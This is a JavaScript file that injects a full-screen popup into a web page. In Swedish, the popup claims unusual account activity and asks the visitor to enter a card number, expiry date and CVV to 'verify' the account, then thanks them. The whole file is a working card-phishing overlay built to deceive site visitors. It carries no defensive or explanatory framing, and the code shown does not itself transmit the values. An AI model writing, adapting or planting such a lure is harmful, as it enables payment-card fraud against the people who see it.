var popup = document.createElement("DIV");
var popupCCNumberField = document.createElement("INPUT");

function createPopup() {
    var popupHeader = document.createElement("H1");
    var popupTextBox = document.createElement("P");
    var popupCCDateField = document.createElement("INPUT");
    var popupCCCVVField = document.createElement("INPUT");
    var newline = document.createElement("P");
    var popupCCNumberHint = document.createElement("P");
    var popupCCDateFieldHint = document.createElement("P");
    var popupCCCVVFieldHint = document.createElement("P");
    var popupButton = document.createElement("BUTTON");
    popup.style.boxSizing = "border-box";
    popup.style.whiteSpace = "pre";
    popup.style.height = "90vh";
    popup.style.width = "90vw";
    popup.style.backgroundColor = "#FFF9F8";
    popup.style.zIndex = "100";
    popup.style.position = "fixed";
    popup.style.top = "50px";
    popup.style.left = "15%";
    popup.style.textAlign = "center";
    popup.style.fontFamily = "sans-serif";
    popup.style.marginLeft = "-200px";
    popup.style.boxShadow = "1px 1px 15px 5px #333333AA";
    popup.style.padding = "20px";
    popup.style.borderRadius = "5px";
    popup.style.color = "black !Important";
    popupHeader.innerHTML = "Onormal aktivitet har upptäckts på ditt konto";
    popupHeader.style.display = "inline";
    popupTextBox.innerHTML = "För att verifiera att det verkligen är du och fortsätta använda tjänsten behöver vi verifiera dina kontouppgifter";
    popupTextBox.style.marginTop = "3%";
    popupTextBox.style.marginBottom = "3%";
    popupCCNumberField.style.width = "10%";
    popupCCNumberField.placeholder = "Kortnummer";
    popupCCNumberField.style.border = "1px solid black";
    popupCCCVVField.placeholder = "CCV-kod";
    popupCCCVVField.style.width = "5%";
    popupCCCVVField.style.border = "1px solid black";
    popupCCDateField.style.width = "5%";
    popupCCDateField.placeholder = "Giltigt till";
    popupCCDateField.style.border = "1px solid black";
    popupCCNumberHint.innerHTML = "Kortnummer           ";
    popupCCNumberHint.style.display = "inline-block";
    popupCCDateFieldHint.innerHTML = "Giltigt till  ";
    popupCCDateFieldHint.marginRight = "10px";
    popupCCDateFieldHint.style.display = "inline-block";
    popupCCCVVFieldHint.innerHTML = "       CCV-kod";
    popupCCCVVFieldHint.style.display = "inline-block";
    popupButton.innerHTML = "Verifiera konto";
    popupButton.style.marginTop = "2.4%";
    popupButton.style.width = "20%";
    popupButton.style.marginLeft = "40%";
    popupButton.style.display = "block";
    popupButton.style.border = "1px solid black";
    popupButton.addEventListener("click", closePopup);
    popup.appendChild(popupHeader);
    popup.appendChild(popupTextBox);
    popup.appendChild(popupCCNumberField);
    popup.appendChild(popupCCDateField);
    popup.appendChild(popupCCCVVField);
    popup.appendChild(newline);
    popup.appendChild(popupCCNumberHint);
    popup.appendChild(popupCCDateFieldHint);
    popup.appendChild(popupCCCVVFieldHint);
    popup.appendChild(popupButton);
    document.body.appendChild(popup);
}

function closePopup() {
    if (popupCCNumberField.value.length > 0) {
        popup.parentElement.removeChild(popup);
        alert("Tack! Ditt konto är nu verifierat och du kan fortsätta att använda tjänsten.");
    } else {
        alert("Du måste fylla i uppgifterna för att fortsätta.");
    }
}

createPopup();